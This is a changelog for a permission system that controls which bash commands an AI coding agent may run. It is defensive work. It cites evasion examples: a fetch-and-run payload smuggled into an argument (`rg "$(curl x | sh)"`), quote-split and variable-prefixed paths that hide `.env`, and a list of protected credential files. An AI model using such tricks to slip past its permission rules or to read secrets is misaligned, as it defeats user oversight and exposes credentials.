...
- Add **Subagent prompt timeout** to `/permission-system`, defaulting to 600 seconds (10 minutes). Set `"forwardedPromptTimeoutSeconds": null` or select **off** for no limit. The configured timeout replaces the hardcoded forwarding deadline and covers the entire request. Prompts show the remaining time.
...
### Fixed
- Preserve the interactive permission owner across fresh extension-module imports, including worktree children and subsequent plain children. Child startup and shutdown cannot replace or remove the parent API or forwarding target. Asks still use parent dialogs with YOLO off; deny policies remain enforced.
...
### Changed
- **Redesigned the bash permission system** around per-piece evaluation. Every bash invocation is parsed with the canonical bash grammar (`mvdan-sh`) and decomposed into the commands it actually executes — across pipes and `&&`/`||`/`;` chains, inside `$(...)`/backtick/process substitutions, loop/conditional bodies, `bash -c "..."` strings, and unwrapped wrappers (`env`, `timeout`, `xargs`, ...) — plus the files it reads and writes via redirections. Each piece resolves individually (protected paths > deny rules > opaque-executable checks > ask rules > registry approval > guarded allow prefixes > tools.bash/defaultPolicy.bash fallback), the overall answer is the most restrictive, and a command whose pieces all allow never prompts: `rg foo | wc -l` and `ls >/dev/null 2>&1` run silently under an empty policy, and heredoc bodies are treated as data, while `rg "$(curl x | sh)"` can no longer ride in on a broad rg rule.
- Replaced glob-map bash rules with **word-prefix rule lists** (`bash.allow`/`ask`/`deny`, e.g. `"git diff"`, `"cargo test"`) matched against normalized argv, killing quote-evasion (`cat .e''nv` matches like `cat .env`). Legacy glob-map configs and the `bashSafety` section are detected at load and reported once with suggested replacements.

### Added
- Added a built-in **safe-command registry** (`src/safe-commands.ts`): a declarative, documented, overridable table that vouches for the read-only forms of common utilities (`rg`, `grep`, `cat`, `git log`, ...), so most agent traffic needs zero configuration. Unsafe arguments (`fd -x`, `sed -i`, `rg --pre`, `sort -o`, `find -delete`, git `-c`/`--ext-diff`, ...) void the vouch. Matching allow-prefix rules must name the unsafe argument; without a matching prefix, the effective bash default applies, including `allow`. Unsafe-pattern and restricted-row expansion findings cannot be covered by allow-prefix rules. Configurable via `bash.registryOverrides`.
- Added **protected paths**: `.env` variants, `.ssh`/`.aws`/`.gnupg`, ssh keys, `*.pem`-style key files, shell history, and credential files are denied to every bash command by default — including through input redirections and `git show HEAD:.env` — outranking every allow rule. Extensible via top-level `protectedPaths`.
- Added a **write-redirection policy**: `>`-style targets resolve through `write:<path>` tool rules, then a default temp-dir allowance (`/tmp`, `$TMPDIR`, ...), then the `write` tool state; `/dev/null` and fd duplications are free. Subshells and brace groups are denied by default and unanalyzable input fails closed to ask, both configurable via `bash.syntax`.
- Reworked local bash approval prompts to summarize up to four blocking pieces (long command displays show their first 60 characters plus an ellipsis, with reasons appended separately) plus an omitted count, and generalized eligible session approvals to `Allow for this session: <families>` (e.g. `mytool`, `git push`) — per-piece prefix approvals that also silence matching pieces of later compound commands, safe by construction because every piece is still evaluated individually.
...
- Added a Claude Code pull-request review workflow. ([6d13fe8](https://github.com/yrahul3910/pi-permission-system/commit/6d13fe8), July 22)

### Changed
- Runtime YOLO toggles no longer synchronize between separate Pi processes. Toggling via the `/permission-system` settings modal or the `__piPermissionSystem` runtime API updates in-memory state: it is never written to the shared `config.json`, and config reloads on `session_start`/`resources_discover`/`before_agent_start` preserve the session's in-memory toggle instead of re-reading it from disk, so enabling YOLO in one Pi process no longer propagates to other running Pi processes. In-process extension instances still shared runtime state in this patch. The `yoloMode` key in `config.json` now only sets the startup default for new sessions, and all other settings (`debug`, `desktopNotifications`, `forwardedPromptTimeoutSeconds`) keep syncing through the config file as before.
...
- Check literal fragments in shell arguments and redirection targets containing expansions against protected paths, so a variable prefix such as `"$HOME/.env"` does not conceal the protected suffix. ([3d09de3](https://github.com/yrahul3910/pi-permission-system/commit/3d09de3), July 22)
- Treat empty `registryOverrides` lists as absent: empty `unsafeArgs` no longer marks a row as restricted, and empty `safeSubcommands` no longer prevents all registry approvals. ([d8c7c05](https://github.com/yrahul3910/pi-permission-system/commit/d8c7c05), July 22)
